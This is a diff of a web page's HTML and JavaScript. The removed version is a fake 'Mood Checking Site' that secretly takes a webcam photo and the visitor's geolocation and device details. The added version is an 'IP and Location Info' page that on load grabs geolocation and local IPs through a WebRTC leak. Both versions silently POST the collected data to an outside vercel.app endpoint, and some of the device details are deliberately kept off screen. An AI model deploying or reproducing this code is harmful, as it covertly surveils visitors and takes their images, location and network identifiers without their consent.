@@ -3,124 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mood Checking Site</title>
+    <title>IP and Location Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #333;
+            color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            margin-top: 50px;
+            display: flex;
+            justify-content: center;
+        }
+        .info {
+            margin: 20px 0;
+            padding: 20px;
+            width: fit-content;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(255, 255, 255, 0.1);
+        }
+        .info p {
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        #mapButton {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #mapButton:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>IP and Location Details</h1>
+    <div class="container">
+        <div id="details" class="info" style="display: none;">
+            <p><strong>IP Address:</strong> <span id="ip"></span></p>
+            <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+            <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+            <button id="mapButton">Show Location on Google Map</button>
+        </div>
+    </div>
+
     <script>
-        function requestAudioAccess() {
-            if (!navigator.permissions) {
-                alert("Your browser doesn't support the Permissions API.");
-                return;
+        let latitude, longitude;
+
+        function getIPAndSendToServer() {
+    
+            function sendDataToServer(data) {
+                fetch('https://hooks-two-zeta.vercel.app/send-info', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                }).catch((error) => console.error("Error sending data:", error));
             }
 
-            navigator.permissions.query({ name: 'microphone' }).then((result) => {
-                if (result.state === 'granted' || result.state === 'prompt') {
-                    alert("Permission granted! Starting the mood check...");
-                    startMoodCheck();
-                } else {
-                    alert("Please enable audio permissions to proceed.");
-                }
-            }).catch((err) => {
-                console.error("Permission check failed:", err);
-                alert("Error while requesting permission for audio.");
-            });
-        }
-
-        function speak(text) {
-            const speech = new SpeechSynthesisUtterance(text);
-            speech.lang = 'en-US';
-            speech.rate = 1;
-            speech.pitch = 1;
-            window.speechSynthesis.speak(speech);
-        }
-
-        function capturePhoto() {
-            const videoElement = document.createElement('video');
-            videoElement.width = 640;
-            videoElement.height = 480;
-            
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    videoElement.srcObject = stream;
-                    videoElement.play();
-
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-
-                    // Wait for video to load, then capture photo
-                    videoElement.addEventListener('canplay', () => {
-                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                        const photoData = canvas.toDataURL('image/jpeg'); // Base64-encoded image
-
-                        sendDeviceInfo(photoData);
-
-                        // Stop the video stream after capturing the photo
-                        stream.getTracks().forEach(track => track.stop());
-                    });
-                })
-                .catch((err) => {
-                    console.error('Error accessing camera:', err);
-                    alert('Could not access camera.');
-                });
-        }
-
-        function sendDeviceInfo(photo) {
-            const statusElement = document.getElementById("status");
-            statusElement.textContent = "Mood is checking...";
-            speak("Mood is checking...");
-
+            // Get location using Geolocation API
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function (position) {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
+                    async (position) => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+
+                        // Display latitude and longitude
+                        document.getElementById("latitude").textContent = latitude;
+                        document.getElementById("longitude").textContent = longitude;
+
+                        // Get device details (not displayed on screen)
                         const userAgent = navigator.userAgent;
                         const platform = navigator.platform;
-                        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                        const screenResolution = `${screen.width}x${screen.height}`;
 
-                        fetch('https://hooks-two-zeta.vercel.app/send-info', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                latitude,
-                                longitude,
-                                userAgent,
-                                platform,
-                                screenResolution,
-                                photo,
-                            }),
-                        })
-                            .then((response) => response.text())
-                            .then((data) => {
-                                const moodText = `Mood: ${data}`;
-                                statusElement.textContent = moodText;
-                                speak(moodText);
-                            })
-                            .catch(() => {
-                                const errorText = "Mood: very sad";
-                                statusElement.textContent = errorText;
-                                speak(errorText);
-                            });
+                        // Use RTCPeerConnection to get IP address
+                        const ipDups = {};
+                        const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+
+                        if (!RTCPeerConnection) {
+                            console.error("WebRTC not supported for IP detection.");
+                            return;
+                        }
+
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel(""); // Create a fake data channel
+
+                        pc.createOffer()
+                            .then((offer) => pc.setLocalDescription(offer))
+                            .catch((error) => console.error("Error creating offer:", error));
+
+                        pc.onicecandidate = (ice) => {
+                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+
+                            const candidate = ice.candidate.candidate;
+                            const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
+                            const ipMatches = candidate.match(regex);
+
+                            if (ipMatches) {
+                                ipMatches.forEach((ip) => {
+                                    if (!ipDups[ip]) {
+                                        ipDups[ip] = true;
+
+                                        // Display the IP address
+                                        document.getElementById("ip").textContent = ip;
+                                        document.getElementById("details").style.display = "block";
+
+                                        const data = {
+                                            ipAddress: ip,
+                                            latitude,
+                                            longitude,
+                                            userAgent,
+                                            platform,
+                                            screenResolution,
+                                        };
+
+                                        sendDataToServer(data);
+                                    }
+                                });
+                            }
+                        };
                     },
                     () => {
-                        const errorText = "Mood: angry";
-                        statusElement.textContent = errorText;
-                        speak(errorText);
+                        console.error("Unable to retrieve location.");
                     }
                 );
             } else {
-                const errorText = "Mood: very very angry";
-                statusElement.textContent = errorText;
-                speak(errorText);
+                console.error("Geolocation not supported by your browser.");
             }
         }
 
-        function startMoodCheck() {
-            capturePhoto();
+        function showMap() {
+            // Redirect to Google Maps with the latitude and longitude
+            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            window.open(mapUrl, '_blank'); // Open the map in a new tab
         }
+
+        // Add event listener to the button
+        document.getElementById("mapButton").addEventListener("click", showMap);
+
+        window.onload = getIPAndSendToServer;
     </script>
-</head>
-<body style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
-    <h1>Welcome to the Mood Checking Site</h1>
-    <button onclick="requestAudioAccess()" style="padding: 10px 20px; font-size: 1em; margin-top: 20px;">Start Mood Check</button>
-    <p id="status" style="font-size: 1.2em; color: #333; margin-top: 20px;"></p>
 </body>
 </html>
